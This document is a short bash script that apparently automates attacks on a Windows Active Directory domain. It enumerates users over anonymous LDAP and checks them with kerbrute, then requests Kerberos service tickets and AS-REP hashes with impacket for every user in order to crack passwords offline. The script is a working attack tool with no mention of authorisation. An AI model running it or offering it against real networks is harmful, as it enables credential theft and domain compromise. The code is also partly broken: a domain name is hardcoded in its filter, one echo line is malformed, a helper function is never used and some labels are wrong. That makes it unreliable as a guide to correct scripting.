#!/bin/bash


if [ "$EUID" -ne 0 ]; then
    echo "Please run this script with sudo privileges."
    exit 1
fi

read -p  "Enter the domain name you found from nmap: " domain_name

#If anon ldap is alowed then
echo "Using windapsearch to get usernames from ldap"
./tools/windapsearch-linux-amd64 -d $domain_name -m users --filter | grep -o 'userPrincipalName: \(.*\)@evil\.local$' | sed -n 's/userPrincipalName: \(.*\)@evil\.local$/\1/p' > $domain_name-users.txt

echo "Usernames will be saved in  a text file "

# Color codes
RED='\033[0;31m' 
NC='\033[0m' # No color

# Prompt the user
echo -e "${RED}Performing kerberosting, please ensure you know the domain password policy to avoid account lockout.${NC}"
echo -e "${RED}Are you sure you want to proceed with kerberosting? (y/n)${NC}"

# Read user input
read -r answer

# Check the user's response
if [ "$answer" == "y" ] || [ "$answer" == "Y" ]; then
    # Proceed with kerberosting
    echo "Proceeding with kerberosting..."
    read -p  "Enter domain ip address: " domain_ip
    ./tools/kerbrute_linux_amd64 userenum $domain_name-users.txt --dc $domain_ip -d $domain_name 
elif [ "$answer" == "n" ] || [ "$answer" == "N" ]; then
    # User chose not to proceed
    echo "Kerberosting canceled."
else
    # Handle invalid input
    echo "Invalid input. Please enter 'y' to proceed or 'n' to cancel."
fi

function check_python_package() {
    if python -c "import $1" 2>/dev/null; then
        echo "$1 is installed."
    else
        echo "$1 is not installed."
        echo "Installing $1..."
        pip install $1
    fi
}

echo"Using impacket for kerberosting"
USERS_FILE="$domain_name-users.txt"

# Check if the users file exists
if [ -f "$USERS_FILE" ]; then
  # Loop through the usernames in the file
  while IFS= read -r username; do
    # Run the script for each username
    impacket-GetUserSPNs -request -dc-ip "$domain_ip" "$domain_name/$username" -no-pass
    impacket-GetNPUsers -request -dc-ip "$domain_ip" "$domain_name/$username" -no-pass
  done < "$USERS_FILE"
else
  echo "Usernames file $USERS_FILE not found."
fi


